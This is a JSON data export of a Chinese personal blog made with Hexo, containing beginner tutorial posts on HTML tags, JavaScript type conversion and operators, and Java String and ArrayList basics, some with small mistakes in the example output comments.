{"meta":{"title":"YanChen","subtitle":null,"description":"博客关注WEB网络安全、IT行业、网络资源、电脑技术、网络安全技术、网络安全知识、互联网安全知识、网站建设技术交流博、学习投资、金融理财","author":"John Doe","url":"https://xiaowuyoucy.github.io","root":"/"},"pages":[{"title":"","date":"2019-12-05T12:12:01.571Z","updated":"2019-03-15T13:29:05.675Z","comments":false,"path":"/404.html","permalink":"https://xiaowuyoucy.github.io//404.html","excerpt":"","text":"404 Not Found：该页无法显示-返回博客首页"},{"title":"关于 陈焱（Yan Chen）","date":"2019-12-05T12:38:10.751Z","updated":"2019-12-05T12:38:10.703Z","comments":false,"path":"about/index.html","permalink":"https://xiaowuyoucy.github.io/about/index.html","excerpt":"","text":"Content One.陈焱的人生事件纪要 Two.Resesume of David Wei Three.Annual Summery of David Wei ​"},{"title":"友链","date":"2019-12-05T12:12:01.608Z","updated":"2019-04-14T19:39:56.059Z","comments":true,"path":"links/index.html","permalink":"https://xiaowuyoucy.github.io/links/index.html","excerpt":"","text":""},{"title":"分类","date":"2019-12-05T12:12:01.590Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"categories/index.html","permalink":"https://xiaowuyoucy.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T12:12:01.877Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"tags/index.html","permalink":"https://xiaowuyoucy.github.io/tags/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2019-12-05T12:12:01.613Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"repository/index.html","permalink":"https://xiaowuyoucy.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"超链接","slug":"html-css00014超链接","date":"2020-02-18T01:46:04.000Z","updated":"2020-02-18T02:55:50.338Z","comments":true,"path":"2020/02/18/html-css00014超链接/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00014超链接/","excerpt":"","text":"超链接 使用超链接可以让我们从一个页面跳转到另一个页面 使用a标签来创建一个超链接: 属性: href:指向链接跳转的目标地址,可以写一个相对路径也可以写一个完整地址. target:可以用来指定打开链接的位置 可选值: _self:表示在当前窗口中打开(默认值) _blank:在新的窗口中打开链接 ​ 123&lt;!-- 超链接 --&gt;&lt;a href=\"http://www.baidu.com\"&gt;我是一个超链接&lt;/a&gt;&lt;a href=\"demo.html\"&gt; 我是一个超链接&lt;/a&gt; 在新窗口打开页面 1234&lt;!-- 在本窗口跳转 --&gt;&lt;a href=\"http://www.baidu.com\" target=\"_self\"&gt;我是一个超链接&lt;/a&gt;&lt;-- 在新窗口打开 --&gt;&lt;a href=\"demo.html\" target=\"_blank\"&gt; 我是一个超链接&lt;/a&gt; 可以在内联框架标签中设置一个name属性值,链接将会在指定的内联框架中打开 123&lt;!-- 内联框架中打开 --&gt;&lt;iframe src=\"demo.html name=\"tom\"&gt;&lt;/iframe&gt;&lt;a href=\"demo.html\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; center标签中的内容,会默认在页面中居中显示 如果我们要内容居中显示,要把内容都放到center标签中 123456&lt;!-- 居中显示 --&gt;&lt;center&gt; a aaaaaa aaaaaa&lt;/center&gt; 如果href中地址不确定,可以先用#代替 如果将链接地址设置为#,点击后会自动回到页面顶部 12&lt;!--回到页面顶部--&gt;&lt;a href=\"#\" target=\"tom\"&gt;我在内联框架显示&lt;/a&gt; html中有一个属性,每一个元素都可以设置,该属性可以作为标签的唯一标识 这个属性就是id,id属性在同一个页面中只能有一个,不能有重复 跳转到id为bottom的元素所在的位置 直接在href中写 #id属性值 12345&lt;a href=\"#bottom\"&gt;回到底部&lt;/a&gt;&lt;!--跳到这里--&gt;&lt;a id=\"bottom\" href=\"https://www.baidu.com\"&gt;哈哈哈&lt;/a&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联框架","slug":"html-css00013内联框架","date":"2020-02-17T22:29:31.000Z","updated":"2020-02-17T22:39:32.645Z","comments":true,"path":"2020/02/18/html-css00013内联框架/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00013内联框架/","excerpt":"","text":"内联框架 使用内联框架可以引入一个外部的页面. 使用iframe来创建一个内联框架 属性: src:指向一个外部页面的路径,可以使用相对路径 width:设置宽度 height:设置高度 不会按比例缩放 name:可以为内联框架指定一个name属性(给框架起名字) 在现实开发中不推荐使用内联框架,因为内联框架中的内容不会被搜索引擎所检索,但可以在内网使用; 一般放在body标签内 格式:&lt;iframe scr=&quot;目标路径&quot; name=&quot;名字&quot;&gt; 1&lt;iframe scr=\"demo.html\" name=\"tom\"&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"xHtml的语法规范","slug":"html-css00012xHtml的语法规范","date":"2020-02-17T21:25:32.000Z","updated":"2020-02-18T02:26:50.768Z","comments":true,"path":"2020/02/18/html-css00012xHtml的语法规范/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00012xHtml的语法规范/","excerpt":"","text":"xHtml的语法规范 浏览器会尽最大的努力正确解析错误的语法,你所有的不符合语法规范的内容,浏览器都会为你自动修正,但是有些情况会修正错误. 1.HTML中不区分大小写,但是我们一般都使用小写 1&lt;p&gt;aaaaaaaaa&lt;/p&gt; 2.HTML中的注释不能嵌套 1234567891011&lt;!--正确写法--&gt;=================================================错误写法&lt;!-- &lt;!-- --&gt;--&gt; 3.HTML标签必须结构完整,要么成对出现,要么自结束标签. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaaa&lt;/p&gt; &lt;!--错误写法--&gt;&lt;p&gt;asdfdsf 4.HTML标签可以嵌套,但是不能交叉嵌套. 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaaaaa&lt;/p&gt;&lt;/font&gt; 5.HTML标签中的属性必须有值,且值必须加引号(双引号,单引号都可以) 12345&lt;!--正确写法--&gt;&lt;p&gt;aaaa&lt;font color=\"red;\"&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;&lt;!--错误写法--&gt;&lt;p&gt;aaaa&lt;font color&gt;aaa&lt;/font&gt;aaa&lt;/p&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"meta标签","slug":"html-css00011meta标签","date":"2020-02-17T21:09:02.000Z","updated":"2020-02-18T02:23:00.419Z","comments":true,"path":"2020/02/18/html-css00011meta标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/18/html-css00011meta标签/","excerpt":"","text":"meta标签 使用meta标签还可以用来设置网页的关键字 格式:&lt;meta name=&quot;keywords&quot; content = &quot;关键字&quot; /&gt; 如果是多个关键字,就用逗号隔开. 关键字是被搜索引擎识别的. 1&lt;meta name=\"keywords\" content=\"HTML5,JavaScript,前端,Java\" /&gt; 使用meta标签用来指定网页的描述 搜索引擎在检索页面时,会同时检索页面中的关键字和描述,但是这两个值不会影响页面在搜索引擎中的排名. 格式:&lt;meta name=&quot;description&quot; content=&quot;描述信息&quot; /&gt; 1&lt;meta name=\"description\" content=\"发布h5,js前端等相关信息\" /&gt; 使用meta可以用来做请求重定向(页面跳转). 格式:&lt;meta http-equiv=&quot;refresh&quot; content=&quot;秒数;url=目标路径&quot; /&gt; 目标路径可以是相对地址 绝对路径要在开头加上https://或http:// 1&lt;meta http-equiv=\"refresh\" content=\"5;http://www.baidu.com\" /&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"算数运算符","slug":"JS00015算数运算符","date":"2020-02-17T09:11:12.000Z","updated":"2020-02-17T09:47:55.146Z","comments":true,"path":"2020/02/17/JS00015算数运算符/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00015算数运算符/","excerpt":"","text":"算数运算符 运算符也叫操作符 通过运算符可以对一个或多个值进行运算,并获取运算结果 比如:typeof就是运算符,可以来获得一个值的类型,它会将该值的类型以字符串的形式返回number string boolean undefined object 1234567console.log(typeof(\"123\"));//stringconsole.log(typeof(1));//numberconsole.log(typeof(1.6));//numberconsole.log(typeof(null));//objectconsole.log(typeof(undefined));//undefinedconsole.log(typeof(NaN));//NaNconsole.log(typeof(true));//boolean 算数运算符: + - * / % 当对非Number类型的值进行运算时,会将这些值转换为Number然后在运算. 任何值和NaN做运算都得NaN 1. +可以对两个值进行加法运算,并将结果返回. 如果对两个字符串做加法,则会拼接在一起 任何值和字符串做加法运算,都会先转换为字符串,然后再拼接 我们可以利用这一点特性来为任何数据类型做String转换. 这是一种隐式类型转换,实际上也是调用了String() 1234567891011121314var a = 123;a = 123 + 2;//125a = true + 1;//2a = true + false;//1a = 2 + null;//2a = 2 + NaN;//NaNa = \"aaa\" + \"bbb\";//aaabbba = 100 + \"aa\";//100aa 2. -可以对两个值进行减法运算,并将结果返回 任何数据类型和数字做减法都会先转换为Number 123456var a = 100;a = 100 - 1;//99a = 100 - \"1\";//99console.log(a - NaN);//NaNconsole.log(a - null);//100console.log(a - undefined);//NaN 3. *可以对两个值进行乘法运算,并将结果返回 任何数据类型和数字做乘法都会先转换为Number 123456var a = 100;a = 100 * 1;//99a = 100 * \"1\";//99console.log(a * NaN);//NaNconsole.log(a * null);//100console.log(a * undefined);//NaN 4. /可以对两个值进行除法运算,并将结果返回 任何数据类型和数字做除法都会先转换为Number 可以通过为一个值0 *1 /1来将其转换为Number 原理和Number()函数一样,使用起来更加简单 1234567var a = 100;a = 100 * 1;//99a = 100 * \"1\";//99console.log(a * NaN);//NaNconsole.log(a * null);//100console.log(a * undefined);//NaNconsole.log(a + \"1\");//101 5.%取模运算符(取余数) 12var a = 10;a = a % 9;//1","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"转换为Boolean","slug":"JS00014转换为Boolean","date":"2020-02-17T08:58:33.000Z","updated":"2020-02-17T09:10:07.684Z","comments":true,"path":"2020/02/17/JS00014转换为Boolean/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00014转换为Boolean/","excerpt":"","text":"转换为Boolean 将其他类型转换为Boolean 使用Boolean()函数 除了0和NaN,其他的都为true 字符串转布尔,除了空串,其余的都是true. null和undefined都会转换为false 对象也会转换为true 12345678910var a = 123;var b = 0;var c = NaN;var d = \"\";console.log(Boolean(a));//trueconsole.log(Boolean(b);//falseconsole.log(Boolean(c));//falseconsole.log(Boolean(d));//falseconsole.log(Boolean(null));//falseconsole.log(Boolean(undefined));//false","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"其他进制的数字","slug":"JS00013其他进制的数字","date":"2020-02-17T08:33:11.000Z","updated":"2020-02-17T08:57:07.851Z","comments":true,"path":"2020/02/17/JS00013其他进制的数字/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00013其他进制的数字/","excerpt":"","text":"其他进制的数字 在JS中,如果需要表示16进制的数字,则需要以0x开头. 12var a = 0x12334;console.log(a); 如果需要表示8进制,则用0开头 12var a = 010;console.log(a); 如果需要表示二进制,用0b开头.但不是所有浏览器都支持. 12var a = 0b010;console.log(a); 有些浏览器会把&quot;070&quot;这种字符串当成10进制 1234var a = \"070\";parseInt(a);//有些浏览器会把这种字符串当成10进制//解决方法parseInt(a,8);","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-Number","slug":"JS00012强制类型转换Number","date":"2020-02-17T07:48:04.000Z","updated":"2020-02-17T08:20:46.379Z","comments":true,"path":"2020/02/17/JS00012强制类型转换Number/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00012强制类型转换Number/","excerpt":"","text":"强制类型转换-Number 将其他数据类型转换为``Number` 字符串----&gt;数字 转换方式一: 使用Number()函数; Number(变量) 1.如果是纯数字的字符串,则直接将其转换为数字 2.如果是字符串中有非数字的内容,则转换为NaN 3.如果字符串是一个空串或者是一个全空格的字符串,则转换为0 4.布尔类型转Number,true会转换为1,false转换为0 5.null ----&gt; 数字0 6.Undefined —&gt; 数字:NaN 转换方式二: 这种方式专门用来转换字符串 parseInt()把一个字符串转换为一个整数. parseInt()可以将一个字符串中的有效的整数内容取出来. 12var a = \"1234px\";var b = parseInt(a);//1234 parseFloat()把一个字符串转换为一个浮点数. 12var a = \"1234.111px\";var b = parseInt(a);//1234.111 如果对非String`使用`parseInt()或``parseFloat()`,他会先将其转换为String,然后在操作 12var a = true;var b = perseInt(true);//返回NaN 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; //Number() var a = \"123\"; a = Number(a); console.log(a); //123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);// 0 //parseInt() || parseFloat(); console.log(\"=========================\"); var a = \"123a\"; a = parseInt(a); console.log(a);//123 var a = \"123\"; a = Number(a); console.log(a);//123 a = true; a = Number(a); console.log(a);//1 a = NaN; a = Number(a); console.log(a);//NaN a = undefined; a = Number(a); console.log(a);//NaN a = null; a = Number(a); console.log(a);//0 &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"强制类型转换-String","slug":"JS00011强制类型转换-String","date":"2020-02-17T07:30:25.000Z","updated":"2020-02-17T07:48:42.013Z","comments":true,"path":"2020/02/17/JS00011强制类型转换-String/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/JS00011强制类型转换-String/","excerpt":"","text":"强制类型转换-String 强制转换类型是指将一个数据类型强制转换为其他的数据类型 类型转换主要指,将其他的数据类型,转换为 String Number Boolean 方式一: 调用被转换数据类型的toString()方法 例如 : a.toString() 该方法不会影响到原变量,他会将转换结果返回. 注意: 如果将null和Undefined这两个值用转换toString()方法就会出错 方式二 调用String()函数,并将转换的数据作为参数传递函数 例如:String(123);----String(123); 使用String();函数做强制转换时: 对于Number和Boolean实际上就是调用toString()方法 但是对于null和undefined,就不会调用toString()方法 他会将null直接转换为&quot;null&quot; 将Undefined直接转换为&quot;Undefined&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var str = 123; console.log(str.toString()); //// str = null; 出错// console.log(str.toString());// str = undefined;出错// console.log(str.toString()); str = 123.3; console.log(str.toString()); str = true; console.log(str.toString()); str = 1231; str = String(str); console.log(str); console.log(\"=================\"); str = 123.2; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = undefined; str = String(str); console.log(str); str = null; str = String(str); console.log(str); str = true; str = String(str); console.log(str); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"JS","slug":"JS","permalink":"https://xiaowuyoucy.github.io/categories/JS/"}],"tags":[]},{"title":"字符串的获取相关方法","slug":"java00056字符串的获取相关方法","date":"2020-02-16T17:44:12.000Z","updated":"2020-02-16T18:01:08.023Z","comments":true,"path":"2020/02/17/java00056字符串的获取相关方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00056字符串的获取相关方法/","excerpt":"","text":"字符串的获取相关方法 常用方法有: public int lenght(); 获取字符串长度 public String concat(String str);拼接两个字符串 public char charAt(int index);返回指定索引的字符 public int indexOf(String str);查找子字符串出现在本字符串的首字符索引值,如果没有则返回-1 1234567891011121314151617181920public class demo09&#123; public static void main(String[] args) &#123; String str = new String(\"abc\"); String str1; int len = 0; int index = 0; char ch; len = str.length();//获取字符串长度 ch = str.charAt(0);//获取str的第0个索引的字符 str1 = str.concat(\"def\");//拼接两个字符串 index = str.indexOf(\"ab\");//查找子字符串第一次出现的索引值 System.out.println(\"字符串长度:\" + len); System.out.println(\"第0个字符是:\" + ch); System.out.println(\"拼接字符:\" + str1); System.out.println(\"字符串出现的\" + index); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的比较方法","slug":"java00055字符串的比较方法","date":"2020-02-16T17:14:16.000Z","updated":"2020-02-16T17:42:58.762Z","comments":true,"path":"2020/02/17/java00055字符串的比较方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00055字符串的比较方法/","excerpt":"","text":"字符串的比较方法 想让两个字符串进行比较,就用: public boolean equals(Object obj);方法,区分大小写 public boolean equalsIgnoreCase(Object obj);不区分字母大小写 参数可以是任何对象,只有参数是一个字符串并且内容相同的才会返回一个true,否者返回false. 1.任何对象都可以用Object来接收. 2.equals方法具有对称性,也就是a.equals(b)和b.equals(a)是一样的 3.如果比较两个字符串一个是字符串常量,另一个是字符串变量,推荐把字符串常量写在前面. 推荐: &quot;zzz&quot;.equals(str); 不推荐 abc.equals(&quot;zzz&quot;); 因为如果abc是一个null又调用equals()就会抛出异常. 如果是zzz.equals(str)则会返回一个false; 12345678910111213public class demo08&#123; public static void main(String[] args) &#123; String str1 = new String(\"123\"); String str2 = new String(\"123\"); String str3 = new String(\"456\"); System.out.println(str1.equals(str2));//true System.out.println(str1.equals(str3));//false System.out.println(\"ABC\".equalsIgnoreCase(\"abc\"));//true &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的常量池","slug":"java00054字符串的常量池","date":"2020-02-16T16:51:33.000Z","updated":"2020-02-16T17:24:17.046Z","comments":true,"path":"2020/02/17/java00054字符串的常量池/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/17/java00054字符串的常量池/","excerpt":"","text":"字符串的常量池 字符串常量池:程序当中直接写上的双引号字符串,就在字符串常量池中. 对于基本类型来说, == 是用来进行数值比较的. 对于引用类型来说,== 是进行地址值的比较. String引用声明出来的字符串是不能直接修改的,修改的只是是地址值.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串的构造和直接创建","slug":"java00053字符串的构造和直接创建","date":"2020-02-15T14:01:21.000Z","updated":"2020-02-15T14:20:47.169Z","comments":true,"path":"2020/02/15/java00053字符串的构造和直接创建/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00053字符串的构造和直接创建/","excerpt":"","text":"字符串的构造和直接创建 创建字符串的常见3+1种方式. 三种构造方法: 1.创建一个空白字符串,不含有任何内容. public String(); 2.根据字符数组的内容,来创建对应的字符串. public String(char[] array); 3.根据字节数组的内容,来创建对应的字符串. public String(byte[] array); 一种直接创建: String str = &quot;abc&quot;; //右边直接用双引号 注意: 直接写上双引号,就是字符串对象了 123456789101112131415161718192021222324public class demo06&#123; public static void main(String[] args) &#123; //直接创建 String str1 = \"qqqqq\"; //创建一个空白字符串 String str2 = new String(); //根据字符数组创建 char[] charv = &#123;'w','w','w','w'&#125;; String str3 = new String(charv); //根据byte数组创建 byte[] bt = &#123;(int)'a',65,67,77,69&#125;; String str4 = new String(bt); System.out.println(str1); System.out.println(str2); System.out.println(str3); System.out.println(str4); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"字符串概述和特点","slug":"java00052字符串概述和特点","date":"2020-02-15T13:53:47.000Z","updated":"2020-02-15T14:00:14.121Z","comments":true,"path":"2020/02/15/java00052字符串概述和特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00052字符串概述和特点/","excerpt":"","text":"字符串概述和特点 字符串概述 java.lang.String类代表字符串 API当中说,Java程序中所有的字符串字面值(如 “abcd”) 都作为此类的实例实现. 其实就是说:程序当中所有的双引号字符串,都是String类的对象.(就算没有 nwe,也照样是.) 字符串的特点 1.字符串的内容永不可变.【重点】 2.因为字符串不可以改变，所以字符串是可以共享使用的。 3.字符串效果上相当于是char[]字符数组，但是底层原理是byte[]字节数组.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数返回类型","slug":"java00051用ArrayList类型做函数返回类型","date":"2020-02-15T13:44:45.000Z","updated":"2020-02-15T13:51:01.494Z","comments":true,"path":"2020/02/15/java00051用ArrayList类型做函数返回类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00051用ArrayList类型做函数返回类型/","excerpt":"","text":"用ArrayList类型做函数返回类型 格式: public static ArrayList&lt;引用类型&gt; 函数名(类型名 变量名 ) 123456789101112131415161718192021222324252627282930313233import java.util.ArrayList;import java.util.Random;/*随机存储20位数到ArrayList中,通过函数调用筛选偶数出来,并存储在一个集合中,然后返回一个只装有偶数的集合.*/public class demo05&#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; smallList; Random r = new Random(); for (int i = 0; i &lt; 20; i++) &#123; intList.add(r.nextInt(1000)); &#125; smallList = isOuShu(intList); System.out.println(\"偶数总个数: \" + smallList.size()); System.out.println(smallList); &#125; //用 ArrayList&lt;Integer&gt;做函数返回类型 public static ArrayList&lt;Integer&gt; isOuShu(ArrayList&lt;Integer&gt; intList) &#123; ArrayList&lt;Integer&gt; smallList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; intList.size(); i++) &#123; int num = intList.get(i); if(num % 2 == 0) &#123; smallList.add(num); &#125; &#125; return smallList; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"用ArrayList类型做函数参数","slug":"java00050用ArrayList类型做函数参数","date":"2020-02-15T13:29:09.000Z","updated":"2020-02-15T13:46:00.025Z","comments":true,"path":"2020/02/15/java00050用ArrayList类型做函数参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00050用ArrayList类型做函数参数/","excerpt":"","text":"用ArrayList类型做函数参数 格式: public static 返回值类型 函数名(ArrayList&lt;引用类型&gt; 变量名 ) 1234567891011121314151617181920212223242526272829import java.util.ArrayList;public class demo04&#123; public static void main(String[] args) &#123; ArrayList&lt;Student&gt; std = new ArrayList&lt;&gt;(); std.add(new Student(\"张三丰\",99)); std.add(new Student(\"张无忌\",19)); std.add(new Student(\"宋远桥\",39)); std.add(new Student(\"张翠山\",44)); printArrayList(std); &#125; //用ArrayList&lt;Student&gt;做函数参数,传递过来的是一个引用的地址 public static void printArrayList(ArrayList&lt;Student&gt; std)&#123; System.out.print(\"&#123;\"); for (int i = 0; i &lt; std.size(); i++) &#123; if(i == std.size() - 1) &#123; System.out.print(std.get(i).getName() + \"&#125;\"); &#125;else&#123; System.out.print(std.get(i).getName() + \"@\"); &#125; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829public class Student&#123; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public Student() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"ArrayList集合存储基本数据","slug":"java00049ArrayList集合存储基本数据","date":"2020-02-15T13:10:36.000Z","updated":"2020-02-15T13:25:16.632Z","comments":true,"path":"2020/02/15/java00049ArrayList集合存储基本数据/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/java00049ArrayList集合存储基本数据/","excerpt":"","text":"ArrayList集合存储基本数据 泛型只能是引用类型,不能是基本类型 如果希望向集合ArrayList当中存储基本类型对应的&quot;包装类&quot;。 基本类型 包装类(引用类型,包装类都位于java.lang包下) byte Byte short Short int Integer long Long float Float double Double char Character boolean Boolean 从JDK 1.5+开始,支持自动装箱和自动拆箱 自动装箱:基本类型自动转换到包装类型 自动拆箱:包装类型自动转换到基本类型 使用格式: ArrayList&lt;Integer&gt; intVal = new ArrayList&lt;&gt;(); 12345678910111213141516171819import java.util.ArrayList;import java.util.List;import java.util.Scanner;public class demo01&#123; public static void main(String[] args) &#123; //使用包装类 ArrayList&lt;Integer&gt; intList = new ArrayList&lt;&gt;(); Scanner sc = new Scanner(System.in); //向列表加入元素 intList.add(888); intList.add(89); intList.add(sc.nextInt()); //输出列表 System.out.println(intList); System.out.println(intList.get(1)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"图片的格式","slug":"html-css00010图片的格式","date":"2020-02-15T03:21:22.000Z","updated":"2020-02-15T03:43:08.487Z","comments":true,"path":"2020/02/15/html-css00010图片的格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00010图片的格式/","excerpt":"","text":"图片的格式 常用的图片格式有三种,分别是：JPG、GIF、PNG. JPEG(JPG) JPEG图片支持的颜色比较多,图片可以压缩,但是不支持透明 一般使用JPEG来保存颜色比较丰富的图片. GIF GIF支持的颜色少,只支持简单的透明,支持动态图 图片颜色单一或者是动态图时可以使用gif PNG PNG支持的颜色多,并且支持复杂的透明 可以用来显示颜色复杂的透明的图片 图片的使用原则 效果不一致,使用效果好的. 效果一致,使用内存小的.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"相对路径","slug":"html-css00009相对路径","date":"2020-02-15T03:05:21.000Z","updated":"2020-02-15T03:52:44.737Z","comments":true,"path":"2020/02/15/html-css00009相对路径/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00009相对路径/","excerpt":"","text":"相对路径 src属性配置的是图片的路径,目前我们所要使用的路径全都是相对路径. 相对路径: 相对路径指相对于当前资源所在目录的位置. 当前文件目录的文件直接写文件名 &lt;img src=&quot;1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 可以使用../来返回上一级目录. &lt;img src=&quot;../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回上上级目录. &lt;img src=&quot;../../1.jpg&quot; alt=&quot;哈哈哈&quot;&gt; 返回几级目录就用几个../ 当前文件的下一级目录. &lt;img src=&quot;abc/123.jpg&quot; alt=&quot;老师&quot;&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"图片标签","slug":"html-css00008图片标签","date":"2020-02-15T02:28:07.000Z","updated":"2020-02-15T02:45:34.126Z","comments":true,"path":"2020/02/15/html-css00008图片标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00008图片标签/","excerpt":"","text":"图片标签 使用img标签来向网页中引入一个外部图片. img标签也是一个自结束标签 属性 src: 设置一个外部图片的路径 &lt;img src=&quot;图片路径&quot; /&gt; alt: &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; /&gt; 1.可以用来设置在图片不能显示时,对图片的描述 2.搜索引擎可以通过alt属性来识别不同的图片. 3如果不写alt属性,则搜索引擎不会对img中的图片进行收录 width:可以用来修改图片宽度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; width=&quot;100px&quot;/&gt; height:可以用来修改图片的高度 &lt;img src=&quot;图片路径&quot; alt=&quot;描述信息&quot; height=&quot;100px&quot; /&gt; 注意: 1.如果宽度和高度两个属性只设置一个,另一个也会同时等比例调整大小. 2.如果两个值同时指定,则按照你指定的值来设置. 3.一般开发中除了自适应的页面,不建议设置width和height.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"实体","slug":"html-css00007实体","date":"2020-02-15T02:15:49.000Z","updated":"2020-02-15T02:26:21.630Z","comments":true,"path":"2020/02/15/html-css00007实体/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/15/html-css00007实体/","excerpt":"","text":"实体 在HTML中,一些如&lt;&gt;这种特殊字符是不能直接使用的,需要使用一些特殊的符号来表示这些特殊字符,这些特殊符号,我们称为实体(转义字符). 浏览器解析到实体时,会自动将实体转换为对应的字符. 实体语法 &amp;实体名字; &lt; 对应的实体是:&amp;lt; &gt;对应的实体是:&amp;gt; 空格实体: &amp;nbsp; 版权符号:&amp;copy; tab制表符实体: &amp;emsp; 其余的可以去查看一些官方的手册.","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"常用的标签","slug":"html-css00006常用的标签","date":"2020-02-14T13:59:23.000Z","updated":"2020-02-15T01:05:16.646Z","comments":true,"path":"2020/02/14/html-css00006常用的标签/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/14/html-css00006常用的标签/","excerpt":"","text":"常用的标签 标签 HTML中的标记指的就是标签. HTML使用标记标签来描述网页 结构: &lt;标签名&gt; 标签内容 &lt;/标签名&gt; 